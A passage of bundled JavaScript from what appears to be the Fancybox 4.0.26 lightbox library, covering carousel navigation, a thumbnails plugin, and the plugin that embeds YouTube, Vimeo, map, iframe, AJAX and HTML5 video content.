              this.slideTo(this.pageIndex + 1);
            },
          },
          {
            key: "slidePrev",
            value: function () {
              this.slideTo(this.pageIndex - 1);
            },
          },
          {
            key: "slideTo",
            value: function (t) {
              var e =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : {},
                i = e.x,
                n = void 0 === i ? -1 * this.setPage(t, !0) : i,
                o = e.y,
                a = void 0 === o ? 0 : o,
                s = e.friction,
                r = void 0 === s ? this.option("friction") : s;
              (this.Panzoom.content.x === n && !this.Panzoom.velocity.x && r) ||
                (this.Panzoom.panTo({
                  x: n,
                  y: a,
                  friction: r,
                  ignoreBounds: !0,
                }),
                "ready" === this.state &&
                  "ready" === this.Panzoom.state &&
                  this.trigger("settle"));
            },
          },
          {
            key: "initPanzoom",
            value: function () {
              var t = this;
              this.Panzoom && this.Panzoom.destroy();
              var e = k(
                !0,
                {},
                {
                  content: this.$track,
                  wrapInner: !1,
                  resizeParent: !1,
                  zoom: !1,
                  click: !1,
                  lockAxis: "x",
                  x: this.pages.length ? -1 * this.pages[this.page].left : 0,
                  centerOnStart: !1,
                  textSelection: function () {
                    return t.option("textSelection", !1);
                  },
                  panOnlyZoomed: function () {
                    return this.content.width <= this.viewport.width;
                  },
                },
                this.option("Panzoom")
              );
              (this.Panzoom = new M(this.$container, e)),
                this.Panzoom.on({
                  "*": function (e) {
                    for (
                      var i = arguments.length,
                        n = new Array(i > 1 ? i - 1 : 0),
                        o = 1;
                      o < i;
                      o++
                    )
                      n[o - 1] = arguments[o];
                    return t.trigger.apply(t, ["Panzoom.".concat(e)].concat(n));
                  },
                  afterUpdate: function () {
                    t.updatePage();
                  },
                  beforeTransform: this.onBeforeTransform.bind(this),
                  touchEnd: this.onTouchEnd.bind(this),
                  endAnimation: function () {
                    t.trigger("settle");
                  },
                }),
                this.updateMetrics(),
                this.manageSlideVisiblity();
            },
          },
          {
            key: "updatePanzoom",
            value: function () {
              this.Panzoom &&
                ((this.Panzoom.content = i(
                  i({}, this.Panzoom.content),
                  {},
                  {
                    fitWidth: this.contentWidth,
                    origWidth: this.contentWidth,
                    width: this.contentWidth,
                  }
                )),
                this.pages.length > 1 &&
                this.option("infiniteX", this.option("infinite"))
                  ? (this.Panzoom.boundX = null)
                  : this.pages.length &&
                    (this.Panzoom.boundX = {
                      from: -1 * this.pages[this.pages.length - 1].left,
                      to: -1 * this.pages[0].left,
                    }),
                this.option("infiniteY", this.option("infinite"))
                  ? (this.Panzoom.boundY = null)
                  : (this.Panzoom.boundY = { from: 0, to: 0 }),
                this.Panzoom.handleCursor());
            },
          },
          {
            key: "manageSlideVisiblity",
            value: function () {
              var t = this,
                e = this.contentWidth,
                i = this.viewportWidth,
                n = this.Panzoom
                  ? -1 * this.Panzoom.content.x
                  : this.pages.length
                  ? this.pages[this.page].left
                  : 0,
                o = this.option("preload"),
                a = this.option("infiniteX", this.option("infinite")),
                s = parseFloat(
                  getComputedStyle(this.$viewport, null).getPropertyValue(
                    "padding-left"
                  )
                ),
                r = parseFloat(
                  getComputedStyle(this.$viewport, null).getPropertyValue(
                    "padding-right"
                  )
                );
              this.slides.forEach(function (l) {
                var c,
                  h,
                  d = 0;
                (c = n - s),
                  (h = n + i + r),
                  (c -= o * (i + s + r)),
                  (h += o * (i + s + r));
                var u = l.left + l.width > c && l.left < h;
                (c = n + e - s), (h = n + e + i + r), (c -= o * (i + s + r));
                var f = a && l.left + l.width > c && l.left < h;
                (c = n - e - s), (h = n - e + i + r), (c -= o * (i + s + r));
                var v = a && l.left + l.width > c && l.left < h;
                f || u || v
                  ? (t.createSlideEl(l),
                    u && (d = 0),
                    f && (d = -1),
                    v && (d = 1),
                    l.left + l.width > n && l.left <= n + i + r && (d = 0))
                  : t.removeSlideEl(l),
                  (l.hasDiff = d);
              });
              var l = 0,
                c = 0;
              this.slides.forEach(function (t, i) {
                var n = 0;
                t.$el
                  ? (i !== l || t.hasDiff ? (n = c + t.hasDiff * e) : (c = 0),
                    (t.$el.style.left =
                      Math.abs(n) > 0.1
                        ? "".concat(c + t.hasDiff * e, "px")
                        : ""),
                    l++)
                  : (c += t.width);
              }),
                this.markSelectedSlides();
            },
          },
          {
            key: "createSlideEl",
            value: function (t) {
              var e;
              if (t) {
                if (!t.$el) {
                  var i,
                    n = document.createElement("div");
                  if (
                    ((n.dataset.index = t.index),
                    (e = n.classList).add.apply(
                      e,
                      m(
                        (
                          this.option("prefix") +
                          this.option("classNames.slide")
                        ).split(" ")
                      )
                    ),
                    t.customClass)
                  )
                    (i = n.classList).add.apply(i, m(t.customClass.split(" ")));
                  t.html && (n.innerHTML = t.html);
                  var o = [];
                  this.slides.forEach(function (t, e) {
                    t.$el && o.push(e);
                  });
                  var a = t.index,
                    s = null;
                  if (o.length) {
                    var r = o.reduce(function (t, e) {
                      return Math.abs(e - a) < Math.abs(t - a) ? e : t;
                    });
                    s = this.slides[r];
                  }
                  return (
                    this.$track.insertBefore(
                      n,
                      s && s.$el
                        ? s.index < t.index
                          ? s.$el.nextSibling
                          : s.$el
                        : null
                    ),
                    (t.$el = n),
                    this.trigger("createSlide", t, a),
                    t
                  );
                }
                var l,
                  c = t.$el.dataset.index;
                (c && parseInt(c, 10) === t.index) ||
                  ((t.$el.dataset.index = t.index),
                  t.$el
                    .querySelectorAll("[data-lazy-srcset]")
                    .forEach(function (t) {
                      t.srcset = t.dataset.lazySrcset;
                    }),
                  t.$el
                    .querySelectorAll("[data-lazy-src]")
                    .forEach(function (t) {
                      var e = t.dataset.lazySrc;
                      t instanceof HTMLImageElement
                        ? (t.src = e)
                        : (t.style.backgroundImage = "url('".concat(e, "')"));
                    }),
                  (l = t.$el.dataset.lazySrc) &&
                    (t.$el.style.backgroundImage = "url('".concat(l, "')")),
                  (t.state = "ready"));
              }
            },
          },
          {
            key: "removeSlideEl",
            value: function (t) {
              t.$el &&
                !t.isDom &&
                (this.trigger("removeSlide", t),
                t.$el.remove(),
                (t.$el = null));
            },
          },
          {
            key: "markSelectedSlides",
            value: function () {
              var t = this,
                e = this.option("classNames.slideSelected"),
                i = "aria-hidden";
              this.slides.forEach(function (n, o) {
                var a = n.$el;
                if (a) {
                  var s = t.pages[t.page];
                  s && s.indexes && s.indexes.indexOf(o) > -1
                    ? (e &&
                        !a.classList.contains(e) &&
                        (a.classList.add(e), t.trigger("selectSlide", n)),
                      a.removeAttribute(i))
                    : (e &&
                        a.classList.contains(e) &&
                        (a.classList.remove(e), t.trigger("unselectSlide", n)),
                      a.setAttribute(i, !0));
                }
              });
            },
          },
          {
            key: "updatePage",
            value: function () {
              this.updateMetrics(), this.slideTo(this.page, { friction: 0 });
            },
          },
          {
            key: "onBeforeTransform",
            value: function () {
              this.option("infiniteX", this.option("infinite")) &&
                this.manageInfiniteTrack(),
                this.manageSlideVisiblity();
            },
          },
          {
            key: "manageInfiniteTrack",
            value: function () {
              var t = this.contentWidth,
                e = this.viewportWidth;
              if (
                !(
                  !this.option("infiniteX", this.option("infinite")) ||
                  this.pages.length < 2 ||
                  t < e
                )
              ) {
                var i = this.Panzoom,
                  n = !1;
                return (
                  i.content.x < -1 * (t - e) &&
                    ((i.content.x += t),
                    (this.pageIndex = this.pageIndex - this.pages.length),
                    (n = !0)),
                  i.content.x > e &&
                    ((i.content.x -= t),
                    (this.pageIndex = this.pageIndex + this.pages.length),
                    (n = !0)),
                  n && "pointerdown" === i.state && i.resetDragPosition(),
                  n
                );
              }
            },
          },
          {
            key: "onTouchEnd",
            value: function (t, e) {
              var i = this.option("dragFree");
              if (
                !i &&
                this.pages.length > 1 &&
                t.dragOffset.time < 350 &&
                Math.abs(t.dragOffset.y) < 1 &&
                Math.abs(t.dragOffset.x) > 5
              )
                this[t.dragOffset.x < 0 ? "slideNext" : "slidePrev"]();
              else if (i) {
                var n = g(this.getPageFromPosition(-1 * t.transform.x), 2)[1];
                this.setPage(n);
              } else this.slideToClosest();
            },
          },
          {
            key: "slideToClosest",
            value: function () {
              var t =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {},
                e = this.getPageFromPosition(-1 * this.Panzoom.content.x),
                i = g(e, 2),
                n = i[1];
              this.slideTo(n, t);
            },
          },
          {
            key: "getPageFromPosition",
            value: function (t) {
              var e = this.pages.length;
              this.option("center") && (t += 0.5 * this.viewportWidth);
              var i = Math.floor(t / this.contentWidth);
              t -= i * this.contentWidth;
              var n = this.slides.find(function (e) {
                return e.left <= t && e.left + e.width > t;
              });
              if (n) {
                var o = this.findPageForSlide(n.index);
                return [o, o + i * e];
              }
              return [0, 0];
            },
          },
          {
            key: "setPage",
            value: function (t, e) {
              var i = 0,
                n = parseInt(t, 10) || 0,
                o = this.page,
                a = this.pageIndex,
                s = this.pages.length,
                r = this.contentWidth,
                l = this.viewportWidth;
              if (
                ((t = ((n % s) + s) % s),
                this.option("infiniteX", this.option("infinite")) && r > l)
              ) {
                var c = Math.floor(n / s) || 0,
                  h = r;
                if (((i = this.pages[t].left + c * h), !0 === e && s > 2)) {
                  var d = -1 * this.Panzoom.content.x,
                    u = i - h,
                    f = i + h,
                    v = Math.abs(d - i),
                    p = Math.abs(d - u),
                    g = Math.abs(d - f);
                  g < v && g <= p
                    ? ((i = f), (n += s))
                    : p < v && p < g && ((i = u), (n -= s));
                }
              } else
                (t = n = Math.max(0, Math.min(n, s - 1))),
                  (i = this.pages.length ? this.pages[t].left : 0);
              return (
                (this.page = t),
                (this.pageIndex = n),
                null !== o &&
                  t !== o &&
                  ((this.prevPage = o),
                  (this.prevPageIndex = a),
                  this.trigger("change", t, o)),
                i
              );
            },
          },
          {
            key: "destroy",
            value: function () {
              var t = this;
              (this.state = "destroy"),
                this.slides.forEach(function (e) {
                  t.removeSlideEl(e);
                }),
                (this.slides = []),
                this.Panzoom.destroy(),
                this.detachPlugins();
            },
          },
        ]),
        n
      );
    })(O);
  (W.version = "4.0.26"), (W.Plugins = D);
  var H = !(
      "undefined" == typeof window ||
      !window.document ||
      !window.document.createElement
    ),
    j = null,
    X = [
      "a[href]",
      "area[href]",
      'input:not([disabled]):not([type="hidden"]):not([aria-hidden])',
      "select:not([disabled]):not([aria-hidden])",
      "textarea:not([disabled]):not([aria-hidden])",
      "button:not([disabled]):not([aria-hidden])",
      "iframe",
      "object",
      "embed",
      "video",
      "audio",
      "[contenteditable]",
      '[tabindex]:not([tabindex^="-"]):not([disabled]):not([aria-hidden])',
    ],
    q = function (t) {
      if (t && H) {
        null === j &&
          document.createElement("div").focus({
            get preventScroll() {
              return (j = !0), !1;
            },
          });
        try {
          if (t.setActive) t.setActive();
          else if (j) t.focus({ preventScroll: !0 });
          else {
            var e = window.pageXOffset || document.body.scrollTop,
              i = window.pageYOffset || document.body.scrollLeft;
            t.focus(),
              document.body.scrollTo({ top: e, left: i, behavior: "auto" });
          }
        } catch (t) {}
      }
    },
    U = (function () {
      function t(e) {
        o(this, t),
          (this.fancybox = e),
          (this.viewport = null),
          (this.pendingUpdate = null);
        for (
          var i = 0, n = ["onReady", "onResize", "onTouchstart", "onTouchmove"];
          i < n.length;
          i++
        ) {
          var a = n[i];
          this[a] = this[a].bind(this);
        }
      }
      return (
        s(t, [
          {
            key: "onReady",
            value: function () {
              var t = window.visualViewport;
              t &&
                ((this.viewport = t),
                (this.startY = 0),
                t.addEventListener("resize", this.onResize),
                this.updateViewport()),
                window.addEventListener("touchstart", this.onTouchstart, {
                  passive: !1,
                }),
                window.addEventListener("touchmove", this.onTouchmove, {
                  passive: !1,
                }),
                window.addEventListener("wheel", this.onWheel, { passive: !1 });
            },
          },
          {
            key: "onResize",
            value: function () {
              this.updateViewport();
            },
          },
          {
            key: "updateViewport",
            value: function () {
              var t = this.fancybox,
                e = this.viewport,
                i = e.scale || 1,
                n = t.$container;
              if (n) {
                var o = "",
                  a = "",
                  s = "";
                i - 1 > 0.1 &&
                  ((o = "".concat(e.width * i, "px")),
                  (a = "".concat(e.height * i, "px")),
                  (s = "translate3d("
                    .concat(e.offsetLeft, "px, ")
                    .concat(e.offsetTop, "px, 0) scale(")
                    .concat(1 / i, ")"))),
                  (n.style.width = o),
                  (n.style.height = a),
                  (n.style.transform = s);
              }
            },
          },
          {
            key: "onTouchstart",
            value: function (t) {
              this.startY = t.touches ? t.touches[0].screenY : t.screenY;
            },
          },
          {
            key: "onTouchmove",
            value: function (t) {
              var e = this.startY,
                i =
                  window.innerWidth /
                  window.document.documentElement.clientWidth;
              if (t.cancelable && !(t.touches.length > 1 || 1 !== i)) {
                var n = C(t.composedPath()[0]);
                if (n) {
                  var o = window.getComputedStyle(n),
                    a = parseInt(o.getPropertyValue("height"), 10),
                    s = t.touches ? t.touches[0].screenY : t.screenY,
                    r = e <= s && 0 === n.scrollTop,
                    l = e >= s && n.scrollHeight - n.scrollTop === a;
                  (r || l) && t.preventDefault();
                } else t.preventDefault();
              }
            },
          },
          {
            key: "onWheel",
            value: function (t) {
              C(t.composedPath()[0]) || t.preventDefault();
            },
          },
          {
            key: "cleanup",
            value: function () {
              this.pendingUpdate &&
                (cancelAnimationFrame(this.pendingUpdate),
                (this.pendingUpdate = null));
              var t = this.viewport;
              t &&
                (t.removeEventListener("resize", this.onResize),
                (this.viewport = null)),
                window.removeEventListener("touchstart", this.onTouchstart, !1),
                window.removeEventListener("touchmove", this.onTouchmove, !1),
                window.removeEventListener("wheel", this.onWheel, {
                  passive: !1,
                });
            },
          },
          {
            key: "attach",
            value: function () {
              this.fancybox.on("initLayout", this.onReady);
            },
          },
          {
            key: "detach",
            value: function () {
              this.fancybox.off("initLayout", this.onReady), this.cleanup();
            },
          },
        ]),
        t
      );
    })(),
    Y = (function () {
      function t(e) {
        o(this, t),
          (this.fancybox = e),
          (this.$container = null),
          (this.state = "init");
        for (
          var i = 0, n = ["onPrepare", "onClosing", "onKeydown"];
          i < n.length;
          i++
        ) {
          var a = n[i];
          this[a] = this[a].bind(this);
        }
        this.events = {
          prepare: this.onPrepare,
          closing: this.onClosing,
          keydown: this.onKeydown,
        };
      }
      return (
        s(t, [
          {
            key: "onPrepare",
            value: function () {
              this.getSlides().length <
              this.fancybox.option("Thumbs.minSlideCount")
                ? (this.state = "disabled")
                : !0 === this.fancybox.option("Thumbs.autoStart") &&
                  this.fancybox.Carousel.Panzoom.content.height >=
                    this.fancybox.option("Thumbs.minScreenHeight") &&
                  this.build();
            },
          },
          {
            key: "onClosing",
            value: function () {
              this.Carousel && this.Carousel.Panzoom.detachEvents();
            },
          },
          {
            key: "onKeydown",
            value: function (t, e) {
              e === t.option("Thumbs.key") && this.toggle();
            },
          },
          {
            key: "build",
            value: function () {
              var t = this;
              if (!this.$container) {
                var e = document.createElement("div");
                e.classList.add("fancybox__thumbs"),
                  this.fancybox.$carousel.parentNode.insertBefore(
                    e,
                    this.fancybox.$carousel.nextSibling
                  ),
                  (this.Carousel = new W(
                    e,
                    k(
                      !0,
                      {
                        Dots: !1,
                        Navigation: !1,
                        Sync: { friction: 0 },
                        infinite: !1,
                        center: !0,
                        fill: !0,
                        dragFree: !0,
                        slidesPerPage: 1,
                        preload: 1,
                      },
                      this.fancybox.option("Thumbs.Carousel"),
                      {
                        Sync: { target: this.fancybox.Carousel },
                        slides: this.getSlides(),
                      }
                    )
                  )),
                  this.Carousel.Panzoom.on("wheel", function (e, i) {
                    i.preventDefault(),
                      t.fancybox[i.deltaY < 0 ? "prev" : "next"]();
                  }),
                  (this.$container = e),
                  (this.state = "visible");
              }
            },
          },
          {
            key: "getSlides",
            value: function () {
              var t,
                e = [],
                i = x(this.fancybox.items);
              try {
                for (i.s(); !(t = i.n()).done; ) {
                  var n = t.value,
                    o = n.thumb;
                  o &&
                    e.push({
                      html: '<div class="fancybox__thumb" style="background-image:url(\''.concat(
                        o,
                        "')\"></div>"
                      ),
                      customClass: "has-thumb has-".concat(n.type || "image"),
                    });
                }
              } catch (t) {
                i.e(t);
              } finally {
                i.f();
              }
              return e;
            },
          },
          {
            key: "toggle",
            value: function () {
              "visible" === this.state
                ? this.hide()
                : "hidden" === this.state
                ? this.show()
                : this.build();
            },
          },
          {
            key: "show",
            value: function () {
              "hidden" === this.state &&
                ((this.$container.style.display = ""),
                this.Carousel.Panzoom.attachEvents(),
                (this.state = "visible"));
            },
          },
          {
            key: "hide",
            value: function () {
              "visible" === this.state &&
                (this.Carousel.Panzoom.detachEvents(),
                (this.$container.style.display = "none"),
                (this.state = "hidden"));
            },
          },
          {
            key: "cleanup",
            value: function () {
              this.Carousel &&
                (this.Carousel.destroy(), (this.Carousel = null)),
                this.$container &&
                  (this.$container.remove(), (this.$container = null)),
                (this.state = "init");
            },
          },
          {
            key: "attach",
            value: function () {
              this.fancybox.on(this.events);
            },
          },
          {
            key: "detach",
            value: function () {
              this.fancybox.off(this.events), this.cleanup();
            },
          },
        ]),
        t
      );
    })();
  Y.defaults = {
    minSlideCount: 2,
    minScreenHeight: 500,
    autoStart: !0,
    key: "t",
    Carousel: {},
  };
  var V = function (t, e) {
      for (
        var i = new URL(t),
          n = new URLSearchParams(i.search),
          o = new URLSearchParams(),
          a = 0,
          s = [].concat(m(n), m(Object.entries(e)));
        a < s.length;
        a++
      ) {
        var r = g(s[a], 2),
          l = r[0],
          c = r[1];
        "t" === l ? o.set("start", parseInt(c)) : o.set(l, c);
      }
      o = o.toString();
      var h = t.match(/#t=((.*)?\d+s)/);
      return h && (o += "#t=".concat(h[1])), o;
    },
    Z = {
      video: { autoplay: !0, ratio: 16 / 9 },
      youtube: {
        autohide: 1,
        fs: 1,
        rel: 0,
        hd: 1,
        wmode: "transparent",
        enablejsapi: 1,
        html5: 1,
      },
      vimeo: {
        hd: 1,
        show_title: 1,
        show_byline: 1,
        show_portrait: 0,
        fullscreen: 1,
      },
      html5video: {
        tpl: '<video class="fancybox__html5video" playsinline controls controlsList="nodownload" poster="{{poster}}">\n  <source src="{{src}}" type="{{format}}" />Sorry, your browser doesn\'t support embedded videos.</video>',
        format: "",
      },
    },
    G = (function () {
      function t(e) {
        o(this, t), (this.fancybox = e);
        for (
          var i = 0,
            n = [
              "onInit",
              "onReady",
              "onCreateSlide",
              "onRemoveSlide",
              "onSelectSlide",
              "onUnselectSlide",
              "onRefresh",
              "onMessage",
            ];
          i < n.length;
          i++
        ) {
          var a = n[i];
          this[a] = this[a].bind(this);
        }
        this.events = {
          init: this.onInit,
          ready: this.onReady,
          "Carousel.createSlide": this.onCreateSlide,
          "Carousel.removeSlide": this.onRemoveSlide,
          "Carousel.selectSlide": this.onSelectSlide,
          "Carousel.unselectSlide": this.onUnselectSlide,
          "Carousel.refresh": this.onRefresh,
        };
      }
      return (
        s(t, [
          {
            key: "onInit",
            value: function () {
              var t,
                e = x(this.fancybox.items);
              try {
                for (e.s(); !(t = e.n()).done; ) {
                  var i = t.value;
                  this.processType(i);
                }
              } catch (t) {
                e.e(t);
              } finally {
                e.f();
              }
            },
          },
          {
            key: "processType",
            value: function (t) {
              if (t.html)
                return (t.src = t.html), (t.type = "html"), void delete t.html;
              var e = t.src || "",
                i = t.type || this.fancybox.options.type,
                n = null;
              if (!e || "string" == typeof e) {
                if (
                  (n = e.match(
                    /(?:youtube\.com|youtu\.be|youtube\-nocookie\.com)\/(?:watch\?(?:.*&)?v=|v\/|u\/|embed\/?)?(videoseries\?list=(?:.*)|[\w-]{11}|\?listType=(?:.*)&list=(?:.*))(?:.*)/i
                  ))
                ) {
                  var o = V(e, this.fancybox.option("Html.youtube")),
                    a = encodeURIComponent(n[1]);
                  (t.videoId = a),
                    (t.src = "https://www.youtube-nocookie.com/embed/"
                      .concat(a, "?")
                      .concat(o)),
                    (t.thumb =
                      t.thumb ||
                      "https://i.ytimg.com/vi/".concat(a, "/mqdefault.jpg")),
                    (t.vendor = "youtube"),
                    (i = "video");
                } else if ((n = e.match(/^.+vimeo.com\/(?:\/)?([\d]+)(.*)?/))) {
                  var s = V(e, this.fancybox.option("Html.vimeo")),
                    r = encodeURIComponent(n[1]);
                  (t.videoId = r),
                    (t.src = "https://player.vimeo.com/video/"
                      .concat(r, "?")
                      .concat(s)),
                    (t.vendor = "vimeo"),
                    (i = "video");
                } else
                  (n = e.match(
                    /(?:maps\.)?google\.([a-z]{2,3}(?:\.[a-z]{2})?)\/(?:(?:(?:maps\/(?:place\/(?:.*)\/)?\@(.*),(\d+.?\d+?)z))|(?:\?ll=))(.*)?/i
                  ))
                    ? ((t.src = "//maps.google."
                        .concat(n[1], "/?ll=")
                        .concat(
                          (n[2]
                            ? n[2] +
                              "&z=" +
                              Math.floor(n[3]) +
                              (n[4] ? n[4].replace(/^\//, "&") : "")
                            : n[4] + ""
                          ).replace(/\?/, "&"),
                          "&output="
                        )
                        .concat(
                          n[4] && n[4].indexOf("layer=c") > 0
                            ? "svembed"
                            : "embed"
                        )),
                      (i = "map"))
                    : (n = e.match(
                        /(?:maps\.)?google\.([a-z]{2,3}(?:\.[a-z]{2})?)\/(?:maps\/search\/)(.*)/i
                      )) &&
                      ((t.src = "//maps.google."
                        .concat(n[1], "/maps?q=")
                        .concat(
                          n[2].replace("query=", "q=").replace("api=1", ""),
                          "&output=embed"
                        )),
                      (i = "map"));
                i ||
                  ("#" === e.charAt(0)
                    ? (i = "inline")
                    : (n = e.match(/\.(mp4|mov|ogv|webm)((\?|#).*)?$/i))
                    ? ((i = "html5video"),
                      (t.format =
                        t.format || "video/" + ("ogv" === n[1] ? "ogg" : n[1])))
                    : e.match(
                        /(^data:image\/[a-z0-9+\/=]*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg|ico)((\?|#).*)?$)/i
                      )
                    ? (i = "image")
                    : e.match(/\.(pdf)((\?|#).*)?$/i) && (i = "pdf")),
                  (t.type = i || this.fancybox.option("defaultType", "image")),
                  ("html5video" !== i && "video" !== i) ||
                    ((t.video = k(
                      {},
                      this.fancybox.option("Html.video"),
                      t.video
                    )),
                    t._width && t._height
                      ? (t.ratio = parseFloat(t._width) / parseFloat(t._height))
                      : (t.ratio = t.ratio || t.video.ratio || Z.video.ratio));
              }
            },
          },
          {
            key: "onReady",
            value: function () {
              var t = this;
              this.fancybox.Carousel.slides.forEach(function (e) {
                e.$el &&
                  (t.setContent(e),
                  e.index === t.fancybox.getSlide().index && t.playVideo(e));
              });
            },
          },
          {
            key: "onCreateSlide",
            value: function (t, e, i) {
              "ready" === this.fancybox.state && this.setContent(i);
            },
          },
          {
            key: "loadInlineContent",
            value: function (t) {
              var e;
              if (t.src instanceof HTMLElement) e = t.src;
              else if ("string" == typeof t.src) {
                var i = t.src.split("#", 2),
                  n = 2 === i.length && "" === i[0] ? i[1] : i[0];
                e = document.getElementById(n);
              }
              if (e) {
                if ("clone" === t.type || e.$placeHolder) {
                  var o = (e = e.cloneNode(!0)).getAttribute("id");
                  (o = o
                    ? "".concat(o, "--clone")
                    : "clone-".concat(this.fancybox.id, "-").concat(t.index)),
                    e.setAttribute("id", o);
                } else {
                  var a = document.createElement("div");
                  a.classList.add("fancybox-placeholder"),
                    e.parentNode.insertBefore(a, e),
                    (e.$placeHolder = a);
                }
                this.fancybox.setContent(t, e);
              } else this.fancybox.setError(t, "{{ELEMENT_NOT_FOUND}}");
            },
          },
          {
            key: "loadAjaxContent",
            value: function (t) {
              var e = this.fancybox,
                i = new XMLHttpRequest();
              e.showLoading(t),
                (i.onreadystatechange = function () {
                  i.readyState === XMLHttpRequest.DONE &&
                    "ready" === e.state &&
                    (e.hideLoading(t),
                    200 === i.status
                      ? e.setContent(t, i.responseText)
                      : e.setError(
                          t,
                          404 === i.status
                            ? "{{AJAX_NOT_FOUND}}"
                            : "{{AJAX_FORBIDDEN}}"
                        ));
                }),
                i.open("GET", t.src),
                i.setRequestHeader("X-Requested-With", "XMLHttpRequest"),
                i.send(t.ajax || null),
                (t.xhr = i);
            },
          },
          {
            key: "loadIframeContent",
            value: function (t) {
              var e = this,
                i = this.fancybox,
                n = document.createElement("iframe");
              if (
                ((n.className = "fancybox__iframe"),
                n.setAttribute(
                  "id",
                  "fancybox__iframe_".concat(i.id, "_").concat(t.index)
                ),
                n.setAttribute("allow", "autoplay; fullscreen"),
                n.setAttribute("scrolling", "auto"),
                (t.$iframe = n),
                "iframe" !== t.type || !1 === t.preload)
              )
                return (
                  n.setAttribute("src", t.src),
                  this.fancybox.setContent(t, n),
                  void this.resizeIframe(t)
                );
              i.showLoading(t);
              var o = document.createElement("div");
              (o.style.visibility = "hidden"),
                this.fancybox.setContent(t, o),
                o.appendChild(n),
                (n.onerror = function () {
                  i.setError(t, "{{IFRAME_ERROR}}");
                }),
                (n.onload = function () {
                  i.hideLoading(t);
                  var o = !1;
                  n.isReady || ((n.isReady = !0), (o = !0)),
                    n.src.length &&
                      ((n.parentNode.style.visibility = ""),
                      e.resizeIframe(t),
                      o && i.revealContent(t));
                }),
                n.setAttribute("src", t.src);
            },
          },
          {
            key: "setAspectRatio",
            value: function (t) {
              var e = t.$content,
                i = t.ratio;
              if (e) {
                var n = t._width,
                  o = t._height;
                if (i || (n && o)) {
                  Object.assign(e.style, {
                    width: n && o ? "100%" : "",
                    height: n && o ? "100%" : "",
                    maxWidth: "",
                    maxHeight: "",
                  });
                  var a = e.offsetWidth,
                    s = e.offsetHeight;
                  if (((o = o || s), (n = n || a) > a || o > s)) {
                    var r = Math.min(a / n, s / o);
                    (n *= r), (o *= r);
                  }
                  Math.abs(n / o - i) > 0.01 &&
                    (i < n / o ? (n = o * i) : (o = n / i)),
                    Object.assign(e.style, {
                      width: "".concat(n, "px"),
                      height: "".concat(o, "px"),
                    });
                }
              }
            },
          },
          {
            key: "resizeIframe",
            value: function (t) {
              var e = t.$iframe;
              if (e) {
                var i = t._width || 0,
                  n = t._height || 0;
                i && n && (t.autoSize = !1);
                var o = e.parentNode,
                  a = o && o.style;
                if (!1 !== t.preload && !1 !== t.autoSize && a)
                  try {
                    var s = window.getComputedStyle(o),
                      r =
                        parseFloat(s.paddingLeft) + parseFloat(s.paddingRight),
                      l =
                        parseFloat(s.paddingTop) + parseFloat(s.paddingBottom),
                      c = e.contentWindow.document,
                      h = c.getElementsByTagName("html")[0],
                      d = c.body;
                    (a.width = ""),
                      (d.style.overflow = "hidden"),
                      (i = i || h.scrollWidth + r),
                      (a.width = "".concat(i, "px")),
                      (d.style.overflow = ""),
                      (a.flex = "0 0 auto"),
                      (a.height = "".concat(d.scrollHeight, "px")),
                      (n = h.scrollHeight + l);
                  } catch (t) {}
                if (i || n) {
                  var u = { flex: "0 1 auto" };
                  i && (u.width = "".concat(i, "px")),
                    n && (u.height = "".concat(n, "px")),
                    Object.assign(a, u);
                }
              }
            },
          },
          {
            key: "onRefresh",
            value: function (t, e) {
              var i = this;
              e.slides.forEach(function (t) {
                t.$el &&
                  (t.$iframe && i.resizeIframe(t),
                  t.ratio && i.setAspectRatio(t));
              });
            },
          },
          {
            key: "setContent",
            value: function (t) {
              if (t && !t.isDom) {
                switch (t.type) {
                  case "html":
                    this.fancybox.setContent(t, t.src);
                    break;
                  case "html5video":
                    this.fancybox.setContent(
                      t,
                      this.fancybox
                        .option("Html.html5video.tpl")
                        .replace(/\{\{src\}\}/gi, t.src)
                        .replace(
                          "{{format}}",
                          t.format ||
                            (t.html5video && t.html5video.format) ||
                            ""
                        )
                        .replace("{{poster}}", t.poster || t.thumb || "")
                    );
                    break;
                  case "inline":
                  case "clone":
                    this.loadInlineContent(t);
                    break;
                  case "ajax":
                    this.loadAjaxContent(t);
                    break;
                  case "pdf":
                  case "video":
                  case "map":
                    t.preload = !1;
                  case "iframe":
                    this.loadIframeContent(t);
                }
                t.ratio && this.setAspectRatio(t);
              }
            },
          },
          {
            key: "onSelectSlide",
            value: function (t, e, i) {
              "ready" === t.state && this.playVideo(i);
            },
          },
          {
            key: "playVideo",
            value: function (t) {
              if ("html5video" === t.type && t.video.autoplay)
                try {
                  var e = t.$el.querySelector("video");
                  if (e) {
                    var i = e.play();
                    void 0 !== i &&
                      i
                        .then(function () {})
                        .catch(function (t) {
                          (e.muted = !0), e.play();
                        });
                  }
                } catch (t) {}
              if ("video" === t.type && t.$iframe && t.$iframe.contentWindow) {
                !(function e() {
                  if (
                    "done" === t.state &&
                    t.$iframe &&
                    t.$iframe.contentWindow
                  ) {
                    var i;
                    if (t.$iframe.isReady)
                      return (
                        t.video &&
                          t.video.autoplay &&
                          (i =
                            "youtube" == t.vendor
                              ? { event: "command", func: "playVideo" }
                              : { method: "play", value: "true" }),
                        void (
                          i &&
                          t.$iframe.contentWindow.postMessage(
                            JSON.stringify(i),
                            "*"
                          )
                        )
                      );
                    "youtube" === t.vendor &&
                      ((i = {
                        event: "listening",
                        id: t.$iframe.getAttribute("id"),
                      }),
                      t.$iframe.contentWindow.postMessage(
                        JSON.stringify(i),
                        "*"
                      ));
                  }
                  t.poller = setTimeout(e, 250);
                })();
              }
            },
          },
          {
            key: "onUnselectSlide",
            value: function (t, e, i) {
              if ("html5video" !== i.type) {
                var n = !1;
                "vimeo" == i.vendor
                  ? (n = { method: "pause", value: "true" })
                  : "youtube" === i.vendor &&
                    (n = { event: "command", func: "pauseVideo" }),
                  n &&
                    i.$iframe &&
                    i.$iframe.contentWindow &&
                    i.$iframe.contentWindow.postMessage(JSON.stringify(n), "*"),
                  clearTimeout(i.poller);
              } else
                try {
                  i.$el.querySelector("video").pause();
                } catch (t) {}
            },
          },
          {
            key: "onRemoveSlide",
            value: function (t, e, i) {
              i.xhr && (i.xhr.abort(), (i.xhr = null)),
                i.$iframe &&
                  ((i.$iframe.onload = i.$iframe.onerror = null),
                  (i.$iframe.src = "//about:blank"),
                  (i.$iframe = null));
              var n = i.$content;
              "inline" === i.type &&
                n &&
                (n.classList.remove("fancybox__content"),
                "none" !== n.style.display && (n.style.display = "none")),
